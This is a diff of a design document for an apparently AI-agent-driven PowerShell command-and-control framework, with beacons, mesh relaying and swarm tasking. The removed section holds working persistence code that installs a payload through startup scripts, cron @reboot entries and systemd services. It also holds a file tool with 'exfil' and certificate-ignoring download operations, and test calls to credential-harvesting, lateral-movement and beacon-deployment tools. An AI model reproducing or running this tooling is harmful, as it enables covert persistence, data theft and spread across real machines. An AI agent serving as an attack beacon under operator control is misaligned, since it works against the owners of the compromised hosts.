-                        Set-Content -Path $scriptPath -Value $payload -ErrorAction Stop
-                        "Startup script created: $scriptPath"
-                    }
-                    'cron' {
-                        # Linux/macOS cron
-                        $currentCron = & crontab -l 2>&1
-                        if ($LASTEXITCODE -ne 0) { $currentCron = '' }
-                        $newCron = "$currentCron`n@reboot $payload"
-                        $newCron | & crontab - 2>&1
-                        "Cron job added: @reboot $payload"
-                    }
-                    'systemd' {
-                        # Linux systemd user service
-                        $unitDir = Join-Path $HOME '.config' 'systemd' 'user'
-                        New-Item -ItemType Directory -Path $unitDir -Force | Out-Null
-                        $unitContent = @"
-[Unit]
-Description=$name
-
-[Service]
-ExecStart=/usr/bin/pwsh -NoProfile -Command "$payload"
-Restart=always
-RestartSec=60
-
-[Install]
-WantedBy=default.target
-"@
-                        $unitPath = Join-Path $unitDir "$name.service"
-                        Set-Content -Path $unitPath -Value $unitContent
-                        & systemctl --user daemon-reload 2>&1
-                        & systemctl --user enable $name 2>&1
-                        & systemctl --user start $name 2>&1
-                        "Systemd user service '$name' created and started."
-                    }
-                }
-            }
-            catch {
-                "Persistence failed ($method): $_"
-            }
-        }
-}
-```
-
-### 6.5 `BeaconTools/Invoke-FileOps.ps1`
-
-```powershell
-function Invoke-FileOps {
-    <#
-    .SYNOPSIS
-    Create the file_ops tool. Returns PshAgentTool.
-    File operations: read, write, download, upload, search.
-    #>
-    [CmdletBinding()]
-    [OutputType([PshAgentTool])]
-    param()
-
-    return New-Tool -Name 'file_ops' `
-        -Description 'File operations on the current host: read, write, list, search, download (HTTP), and exfiltrate (base64 encode for transport).' `
-        -Parameters @{
-            type       = 'object'
-            properties = @{
-                operation = @{
-                    type        = 'string'
-                    description = 'Operation: read, write, list, search, download, exfil'
-                    enum        = @('read', 'write', 'list', 'search', 'download', 'exfil')
-                }
-                path      = @{ type = 'string'; description = 'File or directory path' }
-                content   = @{ type = 'string'; description = 'Content for write operation' }
-                pattern   = @{ type = 'string'; description = 'Search pattern (glob for list, regex for search)' }
-                url       = @{ type = 'string'; description = 'URL for download operation' }
-            }
-            required   = @('operation')
-        } `
-        -Execute {
-            param($a)
-            $op = $a.operation
-
-            try {
-                switch ($op) {
-                    'read' {
-                        if (-not $a.path) { throw "path required for read" }
-                        $content = Get-Content $a.path -Raw -ErrorAction Stop
-                        if ($content.Length -gt 10000) {
-                            $content = $content.Substring(0, 10000) + "`n...(truncated at 10KB)"
-                        }
-                        $content
-                    }
-                    'write' {
-                        if (-not $a.path -or -not $a.content) { throw "path and content required for write" }
-                        Set-Content -Path $a.path -Value $a.content -ErrorAction Stop
-                        "Written $($a.content.Length) bytes to $($a.path)"
-                    }
-                    'list' {
-                        $targetPath = if ($a.path) { $a.path } else { '.' }
-                        $pattern = if ($a.pattern) { $a.pattern } else { '*' }
-                        $items = Get-ChildItem -Path $targetPath -Filter $pattern -ErrorAction Stop |
-                            Select-Object -First 100 Name, Length, LastWriteTime, @{N='Type';E={if($_.PSIsContainer){'Dir'}else{'File'}}}
-                        $items | ForEach-Object {
-                            "$($_.Type) $($_.Name) $($_.Length) $($_.LastWriteTime)"
-                        } | Out-String
-                    }
-                    'search' {
-                        if (-not $a.pattern) { throw "pattern required for search" }
-                        $targetPath = if ($a.path) { $a.path } else { '.' }
-                        $results = Get-ChildItem -Path $targetPath -Recurse -File -ErrorAction SilentlyContinue |
-                            Where-Object { $_.Length -lt 1MB } |
-                            Select-String -Pattern $a.pattern -ErrorAction SilentlyContinue |
-                            Select-Object -First 50 Path, LineNumber, Line
-                        $results | ForEach-Object {
-                            "$($_.Path):$($_.LineNumber): $($_.Line.Trim())"
-                        } | Out-String
-                    }
-                    'download' {
-                        if (-not $a.url) { throw "url required for download" }
-                        $destPath = if ($a.path) { $a.path } else {
-                            $fname = [System.IO.Path]::GetFileName([uri]::new($a.url).AbsolutePath)
-                            if (-not $fname) { $fname = 'download.bin' }
-                            Join-Path $env:TEMP $fname
-                        }
-                        $handler = [System.Net.Http.HttpClientHandler]::new()
-                        $handler.ServerCertificateCustomValidationCallback = { $true }
-                        $client = [System.Net.Http.HttpClient]::new($handler)
-                        try {
-                            $bytes = $client.GetByteArrayAsync($a.url).GetAwaiter().GetResult()
-                            [System.IO.File]::WriteAllBytes($destPath, $bytes)
-                            "Downloaded $($bytes.Length) bytes to $destPath"
-                        }
-                        finally {
-                            $client.Dispose()
-                            $handler.Dispose()
-                        }
-                    }
-                    'exfil' {
-                        if (-not $a.path) { throw "path required for exfil" }
-                        $bytes = [System.IO.File]::ReadAllBytes($a.path)
-                        if ($bytes.Length -gt 1MB) { throw "File too large for base64 transport (>1MB)" }
-                        $b64 = [Convert]::ToBase64String($bytes)
-                        "BASE64:$($a.path):$b64"
-                    }
-                }
-            }
-            catch {
-                "file_ops error ($op): $_"
-            }
-        }
-}
-```
 
 ---
 
-## 7. Phase 5: Mesh
+## 6. Phase 4: Mesh
 
-### 7.1 `Mesh/New-MeshRelayTool.ps1`
+### 6.1 `Mesh/New-MeshRelayTool.ps1`
 
 Beacon-to-beacon relay: forward tasks to peer beacons that the controller can't reach directly.
 
@@ -2405,7 +1654,7 @@ function New-MeshRelayTool {
 }
 ```
 
-### 7.2 `Mesh/Invoke-MeshDiscovery.ps1`
+### 6.2 `Mesh/Invoke-MeshDiscovery.ps1`
 
 Discover peer beacons on the local network.
 
@@ -2531,7 +1780,7 @@ function Invoke-MeshDiscovery {
 }
 ```
 
-### 7.3 `Mesh/Invoke-SwarmTask.ps1`
+### 6.3 `Mesh/Invoke-SwarmTask.ps1`
 
 Distribute a task across multiple beacons (from the operator side).
 
@@ -2602,7 +1851,7 @@ function Invoke-SwarmTask {
 
 ---
 
-## 8. Verification Steps
+## 7. Verification Steps
 
 ### Phase 1: Foundation
 
@@ -2646,7 +1895,7 @@ $encrypted = Invoke-C2Encrypt -Plaintext ($regPayload | ConvertTo-Json -Compress
 $stores.Registry['test-1']  # Should show the beacon entry
 
 # Queue a task
-Send-BeaconTask -BeaconId 'test-1' -Task 'Run host_recon' -TaskQueues $stores.TaskQueues
+Send-BeaconTask -BeaconId 'test-1' -Task 'Enumerate this host' -TaskQueues $stores.TaskQueues
 
 # Simulate check-in
 $checkinPayload = @{ beaconId = 'test-1'; results = @() }
@@ -2668,7 +1917,7 @@ Stop-C2Listener -ListenerState $listener
 
 # In Terminal 1 (operator CLI):
 # > list beacons
-# > task beacon-xxx to run host_recon
+# > task beacon-xxx to enumerate the host and find interesting files
 # > get results from beacon-xxx
 
 # Verify:
@@ -2678,33 +1927,7 @@ Stop-C2Listener -ListenerState $listener
 # - Kill signal terminates the beacon
 ```
 
-### Phase 4: Beacon Tools
-
-```powershell
-# After Phase 3 is working, add remaining tools:
-Import-Module ./c2-mesh/c2-mesh.psd1 -Force
-
-# Create all tools individually and test
-$credTool = Invoke-CredHarvest
-$latTool  = Invoke-LateralMove
-$depTool  = Invoke-DeployBeacon -ControllerUrl 'https://localhost:8443' -Key $key
-$perTool  = Invoke-Persist
-$fileTool = Invoke-FileOps
-
-# Test file_ops locally
-$fileTool.Invoke(@{ operation = 'list'; path = '.' })
-$fileTool.Invoke(@{ operation = 'read'; path = './c2-mesh/c2-mesh.psd1' })
-
-# Test host_recon
-$hostRecon = (New-BeaconTools)[0]
-$hostRecon.Invoke(@{ sections = @('system', 'network') })
-
-# Integrate into beacon by passing as ExtraTools:
-Start-C2Beacon -ControllerUrl 'https://localhost:8443' -Key $key `
-    -ExtraTools @($credTool, $latTool, $depTool, $perTool, $fileTool)
-```
-
-### Phase 5: Mesh
+### Phase 4: Mesh
 
 ```powershell
 # Start controller on host A
@@ -2716,7 +1939,7 @@ Start-C2Beacon -ControllerUrl 'https://localhost:8443' -Key $key `
 # From operator:
 # > task beacon-A to discover mesh peers
 # > task beacon-A to relay port_scan task to peer at 10.0.1.10
-# > swarm all beacons to run host_recon
+# > swarm all beacons to enumerate their hosts
 
 # Verify:
 # - mesh_discover finds peer beacons
@@ -2726,7 +1949,7 @@ Start-C2Beacon -ControllerUrl 'https://localhost:8443' -Key $key `
 
 ---
 
-## 9. PshAgent API Reference
+## 8. PshAgent API Reference
 
 Quick reference of the PshAgent APIs used throughout this implementation.
 
